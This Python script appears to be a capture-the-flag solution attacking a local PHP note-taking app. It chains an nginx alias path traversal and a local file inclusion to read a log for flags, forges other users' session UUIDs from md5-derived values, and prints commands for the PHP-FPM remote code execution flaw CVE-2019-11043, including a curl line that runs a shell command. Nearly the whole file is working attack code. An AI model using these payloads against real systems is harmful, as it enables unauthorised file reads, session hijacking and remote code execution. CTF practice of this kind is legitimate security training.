from math import nan
from requests import Session
from re import findall

username = 'user123'
password = 'password'
s = Session()
url = "http://localhost:8050"

s.get(f'{url}')
s.post(f"{url}/register.php", data={"username":username, "password":password})
s.post(f"{url}/login.php", data={"username":username, "password":password})
s.get(f"{url}/index.php")

#nginx alias path traversal
log = s.get(f"{url}/images../html/log/NoteLog.log")
flags = findall("\w{31}=", log.text)
print(f"Flags: {flags}\nan")

#Local File Include
log = s.post(f"{url}/index.php", data={"file":"../../log/NoteLog.log", "Read":"Read"})
flags = findall("\w{31}=", log.text)
print(f"Flags: {flags}\n")

#Session Forging 
from hashlib import md5
from struct import unpack
from bs4 import BeautifulSoup

""" $_SESSION['uuid'] = $uuid -> forging cookie -> get current session to another user """

index = s.get(f"{url}")
content = BeautifulSoup(index.text, 'html.parser')
usersRaw = content.findAll('div', {"class":"list"})[1]
users = [i.text for i in usersRaw.findAll('li')]
users.remove(username)
for i in users:
    UserUUID = str(md5(i.encode()).hexdigest())[0:4]    
    UserUUID = str(unpack("<L", UserUUID.encode())[0])
    UserUUID = str(md5(UserUUID.encode()).hexdigest())
    print(f"uuid for user {i} is {UserUUID}") 

#RCE PHP (CVE-2019-11043)
print("\n\nExploit RCE:\npython3 cve.py http://nevernote.local:8050/register.php\ncurl http://nevernote.local:8050/register.php?a=/bin/ls+/")
